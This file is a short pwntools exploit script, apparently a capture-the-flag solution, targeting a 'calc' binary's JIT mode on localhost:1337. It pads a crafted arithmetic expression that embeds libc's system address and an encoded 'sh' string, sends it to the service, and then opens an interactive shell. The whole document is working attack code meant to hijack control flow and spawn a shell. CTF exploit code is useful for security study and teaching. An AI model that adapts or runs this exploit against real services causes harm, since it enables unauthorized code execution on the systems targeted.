from pwn import *

exe = ELF("calc")
libc = ELF("libc.so.6")

context.binary = exe
context.aslr = True
context.log_level = "DEBUG"

#p = process(exe.path)
p = remote("localhost", 1337)

ops = "+-*/^()"
sh = unpack(b"sh\x00\x00", 32)

payload = [
    '(', libc.symbols.system, '+', 0x1fb00, ')',
    '+',
    '(', 0x1fb00, '*', 0x1000000000000000, ')'
    '+'
    '(', sh, '-', sh, ')'
]
expr = b""

for i in payload:
    if type(i) != str:
        expr += str(i).encode() 
    else:
        expr += i.encode()
    expr += b" "

expr = b"0 + "*(2520-5) + expr

p.sendlineafter(b"> ", b"jit")
pause()
p.sendlineafter(b"> ", expr)

p.interactive()